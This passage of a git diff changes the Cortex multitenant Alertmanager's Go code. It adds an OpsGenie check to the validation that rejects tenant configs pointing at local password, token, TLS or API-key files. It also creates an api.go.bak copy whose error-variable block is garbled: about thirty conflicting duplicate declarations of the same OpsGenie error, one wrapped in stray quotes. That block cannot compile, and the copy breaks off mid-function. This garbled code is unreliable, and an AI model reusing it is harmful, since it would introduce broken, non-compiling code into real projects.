alertspb.ErrNotFound) {\n+                        return nil\n+                } else if err != nil {\n+                        return errors.Wrapf(err, \"failed to fetch alertmanager config for user %s\", userID)\n+                }\n+                data := map[string]*UserConfig{\n+                        userID: {\n+                                TemplateFiles:      alertspb.ParseTemplates(cfg),\n+                                AlertmanagerConfig: cfg.RawConfig,\n+                        },\n+                }\n+\n+                select {\n+                case iter <- data:\n+                case <-done: // stop early, if sending response has already finished\n+                }\n+\n+                return nil\n+        })\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", \"failed to list all alertmanager configs\", \"err\", err)\n+        }\n+        close(iter)\n+        <-done\n }\n \n // validateAlertmanagerConfig recursively scans the input config looking for data types for which\n // we have a specific validation and, whenever encountered, it runs their validation. Returns the\n // first error or nil if validation succeeds.\n func validateAlertmanagerConfig(cfg interface{}) error {\n-\tv := reflect.ValueOf(cfg)\n-\tt := v.Type()\n-\n-\t// Skip invalid, the zero value or a nil pointer (checked by zero value).\n-\tif !v.IsValid() || v.IsZero() {\n-\t\treturn nil\n-\t}\n-\n-\t// If the input config is a pointer then we need to get its value.\n-\t// At this point the pointer value can't be nil.\n-\tif v.Kind() == reflect.Ptr {\n-\t\tv = v.Elem()\n-\t\tt = v.Type()\n-\t}\n-\n-\t// Check if the input config is a data type for which we have a specific validation.\n-\t// At this point the value can't be a pointer anymore.\n-\tswitch t {\n-\tcase reflect.TypeOf(config.GlobalConfig{}):\n-\t\tif err := validateGlobalConfig(v.Interface().(config.GlobalConfig)); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\n-\tcase reflect.TypeOf(commoncfg.HTTPClientConfig{}):\n-\t\tif err := validateReceiverHTTPConfig(v.Interface().(commoncfg.HTTPClientConfig)); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\n-\tcase reflect.TypeOf(commoncfg.TLSConfig{}):\n-\t\tif err := validateReceiverTLSConfig(v.Interface().(commoncfg.TLSConfig)); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\n-\tcase reflect.TypeOf(config.SlackConfig{}):\n-\t\tif err := validateSlackConfig(v.Interface().(config.SlackConfig)); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\n-\tcase reflect.TypeOf(config.VictorOpsConfig{}):\n-\t\tif err := validateVictorOpsConfig(v.Interface().(config.VictorOpsConfig)); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\n-\t// If the input config is a struct, recursively iterate on all fields.\n-\tif t.Kind() == reflect.Struct {\n-\t\tfor i := 0; i < t.NumField(); i++ {\n-\t\t\tfield := t.Field(i)\n-\t\t\tfieldValue := v.FieldByIndex(field.Index)\n-\n-\t\t\t// Skip any field value which can't be converted to interface (eg. primitive types).\n-\t\t\tif fieldValue.CanInterface() {\n-\t\t\t\tif err := validateAlertmanagerConfig(fieldValue.Interface()); err != nil {\n-\t\t\t\t\treturn err\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tif t.Kind() == reflect.Slice || t.Kind() == reflect.Array {\n-\t\tfor i := 0; i < v.Len(); i++ {\n-\t\t\tfieldValue := v.Index(i)\n-\n-\t\t\t// Skip any field value which can't be converted to interface (eg. primitive types).\n-\t\t\tif fieldValue.CanInterface() {\n-\t\t\t\tif err := validateAlertmanagerConfig(fieldValue.Interface()); err != nil {\n-\t\t\t\t\treturn err\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tif t.Kind() == reflect.Map {\n-\t\tfor _, key := range v.MapKeys() {\n-\t\t\tfieldValue := v.MapIndex(key)\n-\n-\t\t\t// Skip any field value which can't be converted to interface (eg. primitive types).\n-\t\t\tif fieldValue.CanInterface() {\n-\t\t\t\tif err := validateAlertmanagerConfig(fieldValue.Interface()); err != nil {\n-\t\t\t\t\treturn err\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\treturn nil\n+        v := reflect.ValueOf(cfg)\n+        t := v.Type()\n+\n+        // Skip invalid, the zero value or a nil pointer (checked by zero value).\n+        if !v.IsValid() || v.IsZero() {\n+                return nil\n+        }\n+\n+        // If the input config is a pointer then we need to get its value.\n+        // At this point the pointer value can't be nil.\n+        if v.Kind() == reflect.Ptr {\n+                v = v.Elem()\n+                t = v.Type()\n+        }\n+\n+        // Check if the input config is a data type for which we have a specific validation.\n+        // At this point the value can't be a pointer anymore.\n+        switch t {\n+        case reflect.TypeOf(config.GlobalConfig{}):\n+                if err := validateGlobalConfig(v.Interface().(config.GlobalConfig)); err != nil {\n+                        return err\n+                }\n+\n+        case reflect.TypeOf(commoncfg.HTTPClientConfig{}):\n+                if err := validateReceiverHTTPConfig(v.Interface().(commoncfg.HTTPClientConfig)); err != nil {\n+                        return err\n+                }\n+\n+        case reflect.TypeOf(commoncfg.TLSConfig{}):\n+                if err := validateReceiverTLSConfig(v.Interface().(commoncfg.TLSConfig)); err != nil {\n+                        return err\n+                }\n+\n+        case reflect.TypeOf(config.SlackConfig{}):\n+                if err := validateSlackConfig(v.Interface().(config.SlackConfig)); err != nil {\n+                        return err\n+                }\n+\n+        case reflect.TypeOf(config.VictorOpsConfig{}):\n+                if err := validateVictorOpsConfig(v.Interface().(config.VictorOpsConfig)); err != nil {\n+                        return err\n+                }\n+\n+case reflect.TypeOf(config.OpsGenieConfig{}):\n+if err := validateOpsGenieConfig(v.Interface().(config.OpsGenieConfig)); err != nil {\n+return err\n+}\n+        }\n+\n+        // If the input config is a struct, recursively iterate on all fields.\n+        if t.Kind() == reflect.Struct {\n+                for i := 0; i < t.NumField(); i++ {\n+                        field := t.Field(i)\n+                        fieldValue := v.FieldByIndex(field.Index)\n+\n+                        // Skip any field value which can't be converted to interface (eg. primitive types).\n+                        if fieldValue.CanInterface() {\n+                                if err := validateAlertmanagerConfig(fieldValue.Interface()); err != nil {\n+                                        return err\n+                                }\n+                        }\n+                }\n+        }\n+\n+        if t.Kind() == reflect.Slice || t.Kind() == reflect.Array {\n+                for i := 0; i < v.Len(); i++ {\n+                        fieldValue := v.Index(i)\n+\n+                        // Skip any field value which can't be converted to interface (eg. primitive types).\n+                        if fieldValue.CanInterface() {\n+                                if err := validateAlertmanagerConfig(fieldValue.Interface()); err != nil {\n+                                        return err\n+                                }\n+                        }\n+                }\n+        }\n+\n+        if t.Kind() == reflect.Map {\n+                for _, key := range v.MapKeys() {\n+                        fieldValue := v.MapIndex(key)\n+\n+                        // Skip any field value which can't be converted to interface (eg. primitive types).\n+                        if fieldValue.CanInterface() {\n+                                if err := validateAlertmanagerConfig(fieldValue.Interface()); err != nil {\n+                                        return err\n+                                }\n+                        }\n+                }\n+        }\n+\n+        return nil\n }\n \n // validateReceiverHTTPConfig validates the HTTP config and returns an error if it contains\n // settings not allowed by Cortex.\n func validateReceiverHTTPConfig(cfg commoncfg.HTTPClientConfig) error {\n-\tif cfg.BasicAuth != nil && cfg.BasicAuth.PasswordFile != \"\" {\n-\t\treturn errPasswordFileNotAllowed\n-\t}\n-\tif cfg.Authorization != nil && cfg.Authorization.CredentialsFile != \"\" {\n-\t\treturn errPasswordFileNotAllowed\n-\t}\n-\tif cfg.BearerTokenFile != \"\" {\n-\t\treturn errPasswordFileNotAllowed\n-\t}\n-\tif cfg.OAuth2 != nil && cfg.OAuth2.ClientSecretFile != \"\" {\n-\t\treturn errOAuth2SecretFileNotAllowed\n-\t}\n-\treturn validateReceiverTLSConfig(cfg.TLSConfig)\n+        if cfg.BasicAuth != nil && cfg.BasicAuth.PasswordFile != \"\" {\n+                return errPasswordFileNotAllowed\n+        }\n+        if cfg.Authorization != nil && cfg.Authorization.CredentialsFile != \"\" {\n+                return errPasswordFileNotAllowed\n+        }\n+        if cfg.BearerTokenFile != \"\" {\n+                return errPasswordFileNotAllowed\n+        }\n+        if cfg.OAuth2 != nil && cfg.OAuth2.ClientSecretFile != \"\" {\n+                return errOAuth2SecretFileNotAllowed\n+        }\n+        return validateReceiverTLSConfig(cfg.TLSConfig)\n }\n \n // validateReceiverTLSConfig validates the TLS config and returns an error if it contains\n // settings not allowed by Cortex.\n func validateReceiverTLSConfig(cfg commoncfg.TLSConfig) error {\n-\tif cfg.CAFile != \"\" || cfg.CertFile != \"\" || cfg.KeyFile != \"\" {\n-\t\treturn errTLSFileNotAllowed\n-\t}\n-\treturn nil\n+        if cfg.CAFile != \"\" || cfg.CertFile != \"\" || cfg.KeyFile != \"\" {\n+                return errTLSFileNotAllowed\n+        }\n+        return nil\n }\n \n // validateGlobalConfig validates the Global config and returns an error if it contains\n // settings now allowed by Cortex.\n func validateGlobalConfig(cfg config.GlobalConfig) error {\n-\tif cfg.SlackAPIURLFile != \"\" {\n-\t\treturn errSlackAPIURLFileNotAllowed\n-\t}\n-\treturn nil\n+        if cfg.SlackAPIURLFile != \"\" {\n+                return errSlackAPIURLFileNotAllowed\n+        }\n+        return nil\n }\n \n // validateSlackConfig validates the Slack config and returns an error if it contains\n // settings now allowed by Cortex.\n func validateSlackConfig(cfg config.SlackConfig) error {\n-\tif cfg.APIURLFile != \"\" {\n-\t\treturn errSlackAPIURLFileNotAllowed\n-\t}\n-\treturn nil\n+        if cfg.APIURLFile != \"\" {\n+                return errSlackAPIURLFileNotAllowed\n+        }\n+        return nil\n+}\n+\n+// validateOpsGenieConfig validates the OpsGenie config and returns an error if it contains\n+// settings now allowed by Cortex.\n+func validateOpsGenieConfig(cfg config.OpsGenieConfig) error {\n+if cfg.APIKeyFile != \"\" {\n+return errOpsGenieAPIKeyFileNotAllowed\n+}\n+return nil\n }\n \n // validateVictorOpsConfig validates the VictorOps config and returns an error if it contains\n // settings now allowed by Cortex.\n func validateVictorOpsConfig(cfg config.VictorOpsConfig) error {\n-\tif cfg.APIKeyFile != \"\" {\n-\t\treturn errVictorOpsAPIKeyFileNotAllowed\n-\t}\n-\treturn nil\n+        if cfg.APIKeyFile != \"\" {\n+                return errVictorOpsAPIKeyFileNotAllowed\n+        }\n+        return nil\n }\ndiff --git a/pkg/alertmanager/api.go.bak b/pkg/alertmanager/api.go.bak\nnew file mode 100644\nindex 000000000..7b4966fc0\n--- /dev/null\n+++ b/pkg/alertmanager/api.go.bak\n@@ -0,0 +1,495 @@\n+package alertmanager\n+\n+import (\n+        \"context\"\n+        \"fmt\"\n+        \"io\"\n+        \"net/http\"\n+        \"os\"\n+        \"path/filepath\"\n+        \"reflect\"\n+\n+        \"github.com/go-kit/log\"\n+        \"github.com/go-kit/log/level\"\n+        \"github.com/pkg/errors\"\n+        \"github.com/prometheus/alertmanager/config\"\n+        \"github.com/prometheus/alertmanager/template\"\n+        commoncfg \"github.com/prometheus/common/config\"\n+        \"gopkg.in/yaml.v2\"\n+\n+        \"github.com/cortexproject/cortex/pkg/alertmanager/alertspb\"\n+        \"github.com/cortexproject/cortex/pkg/tenant\"\n+        \"github.com/cortexproject/cortex/pkg/util\"\n+        \"github.com/cortexproject/cortex/pkg/util/concurrency\"\n+        util_log \"github.com/cortexproject/cortex/pkg/util/log\"\n+)\n+\n+const (\n+        errMarshallingYAML       = \"error marshalling YAML Alertmanager config\"\n+        errValidatingConfig      = \"error validating Alertmanager config\"\n+        errReadingConfiguration  = \"unable to read the Alertmanager config\"\n+        errStoringConfiguration  = \"unable to store the Alertmanager config\"\n+        errDeletingConfiguration = \"unable to delete the Alertmanager config\"\n+        errNoOrgID               = \"unable to determine the OrgID\"\n+        errListAllUser           = \"unable to list the Alertmanager users\"\n+        errConfigurationTooBig   = \"Alertmanager configuration is too big, limit: %d bytes\"\n+        errTooManyTemplates      = \"too many templates in the configuration: %d (limit: %d)\"\n+        errTemplateTooBig        = \"template %s is too big: %d bytes (limit: %d bytes)\"\n+\n+        fetchConcurrency = 16\n+)\n+\n+var (\n+        errPasswordFileNotAllowed        = errors.New(\"setting password_file, bearer_token_file and credentials_file is not allowed\")\n+        errOAuth2SecretFileNotAllowed    = errors.New(\"setting OAuth2 client_secret_file is not allowed\")\n+        errTLSFileNotAllowed             = errors.New(\"setting TLS ca_file, cert_file and key_file is not allowed\")\n+        errSlackAPIURLFileNotAllowed     = errors.New(\"setting Slack api_url_file and global slack_api_url_file is not allowed\")\n+                                errVictorOpsAPIKeyFileNotAllowed = errors.New(\"setting VictorOps api_key_file is not allowed\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+\"errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\"\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+       errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed= errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"setting OpsGenie api_key_file is not allowed\")\n+errOpsGenieAPIKeyFileNotAllowed  = errors.New(\"opsgenie_configs.api_key_file is not supported in Cortex Alertmanager\")\n+)\n+\n+// UserConfig is used to communicate a users alertmanager configs\n+type UserConfig struct {\n+        TemplateFiles      map[string]string `yaml:\"template_files\"`\n+        AlertmanagerConfig string            `yaml:\"alertmanager_config\"`\n+}\n+\n+func (am *MultitenantAlertmanager) GetUserConfig(w http.ResponseWriter, r *http.Request) {\n+        logger := util_log.WithContext(r.Context(), am.logger)\n+\n+        userID, err := tenant.TenantID(r.Context())\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errNoOrgID, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errNoOrgID, err.Error()), http.StatusUnauthorized)\n+                return\n+        }\n+\n+        cfg, err := am.store.GetAlertConfig(r.Context(), userID)\n+        if err != nil {\n+                if err == alertspb.ErrNotFound {\n+                        http.Error(w, err.Error(), http.StatusNotFound)\n+                } else {\n+                        http.Error(w, err.Error(), http.StatusInternalServerError)\n+                }\n+                return\n+        }\n+\n+        d, err := yaml.Marshal(&UserConfig{\n+                TemplateFiles:      alertspb.ParseTemplates(cfg),\n+                AlertmanagerConfig: cfg.RawConfig,\n+        })\n+\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errMarshallingYAML, \"err\", err, \"user\", userID)\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errMarshallingYAML, err.Error()), http.StatusInternalServerError)\n+                return\n+        }\n+\n+        w.Header().Set(\"Content-Type\", \"application/yaml\")\n+        if _, err := w.Write(d); err != nil {\n+                http.Error(w, err.Error(), http.StatusInternalServerError)\n+                return\n+        }\n+}\n+\n+func (am *MultitenantAlertmanager) SetUserConfig(w http.ResponseWriter, r *http.Request) {\n+        logger := util_log.WithContext(r.Context(), am.logger)\n+        userID, err := tenant.TenantID(r.Context())\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errNoOrgID, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errNoOrgID, err.Error()), http.StatusUnauthorized)\n+                return\n+        }\n+\n+        var input io.Reader\n+        maxConfigSize := am.limits.AlertmanagerMaxConfigSize(userID)\n+        if maxConfigSize > 0 {\n+                // LimitReader will return EOF after reading specified number of bytes. To check if\n+                // we have read too many bytes, allow one extra byte.\n+                input = io.LimitReader(r.Body, int64(maxConfigSize)+1)\n+        } else {\n+                input = r.Body\n+        }\n+\n+        payload, err := io.ReadAll(input)\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errReadingConfiguration, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errReadingConfiguration, err.Error()), http.StatusBadRequest)\n+                return\n+        }\n+\n+        if maxConfigSize > 0 && len(payload) > maxConfigSize {\n+                msg := fmt.Sprintf(errConfigurationTooBig, maxConfigSize)\n+                level.Warn(logger).Log(\"msg\", msg)\n+                http.Error(w, msg, http.StatusBadRequest)\n+                return\n+        }\n+\n+        cfg := &UserConfig{}\n+        err = yaml.Unmarshal(payload, cfg)\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errMarshallingYAML, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errMarshallingYAML, err.Error()), http.StatusBadRequest)\n+                return\n+        }\n+\n+        cfgDesc := alertspb.ToProto(cfg.AlertmanagerConfig, cfg.TemplateFiles, userID)\n+        if err := validateUserConfig(logger, cfgDesc, am.limits, userID); err != nil {\n+                level.Warn(logger).Log(\"msg\", errValidatingConfig, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errValidatingConfig, err.Error()), http.StatusBadRequest)\n+                return\n+        }\n+\n+        err = am.store.SetAlertConfig(r.Context(), cfgDesc)\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errStoringConfiguration, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errStoringConfiguration, err.Error()), http.StatusInternalServerError)\n+                return\n+        }\n+\n+        w.WriteHeader(http.StatusCreated)\n+}\n+\n+// DeleteUserConfig is exposed via user-visible API (if enabled, uses DELETE method), but also as an internal endpoint using POST method.\n+// Note that if no config exists for a user, StatusOK is returned.\n+func (am *MultitenantAlertmanager) DeleteUserConfig(w http.ResponseWriter, r *http.Request) {\n+        logger := util_log.WithContext(r.Context(), am.logger)\n+        userID, err := tenant.TenantID(r.Context())\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errNoOrgID, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errNoOrgID, err.Error()), http.StatusUnauthorized)\n+                return\n+        }\n+\n+        err = am.store.DeleteAlertConfig(r.Context(), userID)\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", errDeletingConfiguration, \"err\", err.Error())\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errDeletingConfiguration, err.Error()), http.StatusInternalServerError)\n+                return\n+        }\n+\n+        w.WriteHeader(http.StatusOK)\n+}\n+\n+// Partially copied from: https://github.com/prometheus/alertmanager/blob/8e861c646bf67599a1704fc843c6a94d519ce312/cli/check_config.go#L65-L96\n+func validateUserConfig(logger log.Logger, cfg alertspb.AlertConfigDesc, limits Limits, user string) error {\n+        // We don't have a valid use case for empty configurations. If a tenant does not have a\n+        // configuration set and issue a request to the Alertmanager, we'll a) upload an empty\n+        // config and b) immediately start an Alertmanager instance for them if a fallback\n+        // configuration is provisioned.\n+        if cfg.RawConfig == \"\" {\n+                return fmt.Errorf(\"configuration provided is empty, if you'd like to remove your configuration please use the delete configuration endpoint\")\n+        }\n+\n+        amCfg, err := config.Load(cfg.RawConfig)\n+        if err != nil {\n+                return err\n+        }\n+\n+        // Validate the config recursively scanning it.\n+        if err := validateAlertmanagerConfig(amCfg); err != nil {\n+                return err\n+        }\n+\n+        // Validate templates referenced in the alertmanager config.\n+        for _, name := range amCfg.Templates {\n+                if err := validateTemplateFilename(name); err != nil {\n+                        return err\n+                }\n+        }\n+\n+        // Check template limits.\n+        if l := limits.AlertmanagerMaxTemplatesCount(user); l > 0 && len(cfg.Templates) > l {\n+                return fmt.Errorf(errTooManyTemplates, len(cfg.Templates), l)\n+        }\n+\n+        if maxSize := limits.AlertmanagerMaxTemplateSize(user); maxSize > 0 {\n+                for _, tmpl := range cfg.Templates {\n+                        if size := len(tmpl.GetBody()); size > maxSize {\n+                                return fmt.Errorf(errTemplateTooBig, tmpl.GetFilename(), size, maxSize)\n+                        }\n+                }\n+        }\n+\n+        // Validate template files.\n+        for _, tmpl := range cfg.Templates {\n+                if err := validateTemplateFilename(tmpl.Filename); err != nil {\n+                        return err\n+                }\n+        }\n+\n+        // Create templates on disk in a temporary directory.\n+        // Note: This means the validation will succeed if we can write to tmp but\n+        // not to configured data dir, and on the flipside, it'll fail if we can't write\n+        // to tmpDir. Ignoring both cases for now as they're ultra rare but will revisit if\n+        // we see this in the wild.\n+        userTempDir, err := os.MkdirTemp(\"\", \"validate-config-\"+cfg.User)\n+        if err != nil {\n+                return err\n+        }\n+        defer os.RemoveAll(userTempDir)\n+\n+        for _, tmpl := range cfg.Templates {\n+                templateFilepath, err := safeTemplateFilepath(userTempDir, tmpl.Filename)\n+                if err != nil {\n+                        level.Error(logger).Log(\"msg\", \"unable to create template file path\", \"err\", err, \"user\", cfg.User)\n+                        return err\n+                }\n+\n+                if _, err = storeTemplateFile(templateFilepath, tmpl.Body); err != nil {\n+                        level.Error(logger).Log(\"msg\", \"unable to store template file\", \"err\", err, \"user\", cfg.User)\n+                        return fmt.Errorf(\"unable to store template file '%s'\", tmpl.Filename)\n+                }\n+        }\n+\n+        templateFiles := make([]string, len(amCfg.Templates))\n+        for i, t := range amCfg.Templates {\n+                templateFiles[i] = filepath.Join(userTempDir, t)\n+        }\n+\n+        _, err = template.FromGlobs(templateFiles...)\n+        if err != nil {\n+                return err\n+        }\n+\n+        // Note: Not validating the MultitenantAlertmanager.transformConfig function as that\n+        // that function shouldn't break configuration. Only way it can fail is if the base\n+        // autoWebhookURL itself is broken. In that case, I would argue, we should accept the config\n+        // not reject it.\n+\n+        return nil\n+}\n+\n+func (am *MultitenantAlertmanager) ListAllConfigs(w http.ResponseWriter, r *http.Request) {\n+        logger := util_log.WithContext(r.Context(), am.logger)\n+        userIDs, err := am.store.ListAllUsers(r.Context())\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", \"failed to list users of alertmanager\", \"err\", err)\n+                http.Error(w, fmt.Sprintf(\"%s: %s\", errListAllUser, err.Error()), http.StatusInternalServerError)\n+                return\n+        }\n+\n+        done := make(chan struct{})\n+        iter := make(chan interface{})\n+\n+        go func() {\n+                util.StreamWriteYAMLResponse(w, iter, logger)\n+                close(done)\n+        }()\n+\n+        err = concurrency.ForEachUser(r.Context(), userIDs, fetchConcurrency, func(ctx context.Context, userID string) error {\n+                cfg, err := am.store.GetAlertConfig(ctx, userID)\n+                if errors.Is(err, alertspb.ErrNotFound) {\n+                        return nil\n+                } else if err != nil {\n+                        return errors.Wrapf(err, \"failed to fetch alertmanager config for user %s\", userID)\n+                }\n+                data := map[string]*UserConfig{\n+                        userID: {\n+                                TemplateFiles:      alertspb.ParseTemplates(cfg),\n+                                AlertmanagerConfig: cfg.RawConfig,\n+                        },\n+                }\n+\n+                select {\n+                case iter <- data:\n+                case <-done: // stop early, if sending response has already finished\n+                }\n+\n+                return nil\n+        })\n+        if err != nil {\n+                level.Error(logger).Log(\"msg\", \"failed to list all alertmanager configs\", \"err\", err)\n+        }\n+        close(iter)\n+        <-done\n+}\n+\n+// validateAlertmanagerConfig recursively scans the input config looking for data types for which\n+// we have a specific validation and, whenever encountered, it runs their validation. Returns the\n+// first error or nil if validation succeeds.\n+func validateAlertmanagerConfig(cfg interface{}) error {\n+        v := reflect.ValueOf(cfg)\n+        t := v.Type()\n+\n+        // Skip invalid, the zero value or a nil pointer (checked by zero value).\n+        if !v.IsValid() || v.IsZero() {\n+                return nil\n+        }\n+\n+        // If the input config is a pointer then we need to get its value.\n+        // At this point the pointer value can't be nil.\n+        if v.Kind() == reflect.Ptr {\n+                v = v.Elem()\n+                t = v.Type()\n+        }\n+\n+        // Check if the input config is a data type for which we have a specific validation.\n+        // At this point the value can't be a pointer anymore.\n+        switch t {\n+        case reflect.TypeOf(config.GlobalConfig{}):\n+                if err := validateGlobalConfig(v.Interface().(config.GlobalConfig)); err != nil {\n+                        return err\n+                }\n+\n+        case reflect.TypeOf(commoncfg.HTTPClientConfig{}):\n+                if err := validateReceiverHTTPConfig(v.Interface().(commoncfg.HTTPClientConfig)); err != nil {\n+                        return err\n+                }\n+\n+        case reflect.TypeOf(commoncfg.TLSConfig{}):\n+                if err := validateReceiverTLSConfig(v.Interface().(commoncfg.TLSConfig)); err != nil {\n+                        return err\n+                }\n+\n+        case reflect.TypeOf(config.SlackConfig{}):\n+                if err := validateSlackConfig(v.Interface().(config.SlackConfig)); err != nil {\n+                        return err\n+                }\n+\n+        case reflect.TypeOf(config.VictorOpsConfig{}):\n+                if err := validateVictorOpsConfig(v.Interface().(config.VictorOpsConfig)); err != nil {\n+                        return err\n+                }\n+\n+case reflect.TypeOf(config.OpsGenieConfig{}):\n+if err := validateOpsGenieConfig(v.Interface().(config.OpsGenieConfig)); err != nil {\n+return err\n+}\n+        }\n+\n+        // If the input config is a struct, recursively iterate on all fields.\n+        if t.Kind() == reflect.Struct {\n+                for i := 0; i < t.NumField(); i++ {\n+                        field := t.Field(i)\n+                        fieldValue := v.FieldByIndex(field.Index)\n+\n+                        // Skip any field value which can't be converted to interface (eg. primitive types).\n+                        if fieldValue.CanInterface() {\n+                                if err := validateAlertmanagerConfig(fieldValue.Interface()); err != nil {\n+                                        return err\n+                                }\n+                        }\n+                }\n+        }\n+\n+        if t.Kind() == reflect.Slice || t.Kind() == reflect.Array {\n+                for i := 0; i < v.Len(); i++ {\n+                        fieldValue := v.Index(i)\n+\n+                        // Skip any field value which can't be converted to interface (eg. primitive types).\n+                        if fieldValue.CanInterface() {\n+                                if err := validateAlertmanagerConfig(fieldValue.Interface()); err != nil {\n+                                        return err\n+                                }\n+                        }\n+                }\n+        }\n+\n+        if t.Kind() == reflect.Map {\n+                for _, key := range v.MapKeys() {\n+                        fieldValue := v.MapIndex(key)\n+\n+                        // Skip any field value which can't be converted to interface (eg. primitive types).\n+                        if fieldValue.CanInterface() {\n+                                if err := validateAlertmanagerConfig(fieldValue.Interface()); err != nil {\n+                                        return err\n+                                }\n+                        }\n+                }\n+        }\n+\n+        return nil\n+}\n+\n+// validateReceiverHTTPConfig validates the HTTP config and returns an error if it contains\n+// settings not allowed by Cortex.\n+func validateReceiverHTTPConfig(cfg commoncfg.HTTPClientConfig) error {\n+        if cfg.BasicAuth != nil && cfg.BasicAuth.PasswordFile != \"\" {\n+                return errPasswordFileNotAllowed\n+        }\n+        if cfg.Authorization != nil && cfg.Authorization.CredentialsFile != \"\" {\n+                return errPasswordFileNotAllowed\n+        }\n+        if cfg.BearerTokenFile != \"\" {\n+                return errPasswordFileNotAllowed\n+        }\n+        if cfg.OAuth2 != nil && cfg.OAuth2.ClientSecretFile != \"\" {\n+                return errOAuth2SecretFileNotAllowed\n+        }\n+        return validateReceiverTLSConfig(cfg.TLSConfig)\n+}\n+\n+// validateReceiverTLSConfig validates the TLS config and returns an error if it contains\n+// settings not allowed by Cortex.\n+func validateReceiverTLSConfig(cfg commoncfg.TLSConfig) error {\n+        if cfg.CAFile != \"\" || cfg.CertFile != \"\" || cfg.KeyFile != \"\" {\n+                return errTLSFileNotAllowed\n+        }\n+        return nil\n+}\n+\n+// validateGlobalConfig validates the Global config and returns an error if it contains\n+// settings now allowed by Cortex.\n+func validateGlobalConfig(cfg config.GlobalConfig) error {\n+        if cfg.SlackAPIURLFile != \"\" {\n+                return errSlackAPIURLFileNotAllowed\n+        }\n+        return nil\n+}\n+\n+// validateSlackConfig validates the Slack config and returns an error if it contains\n+// settings now allowed by Cortex.\n+func 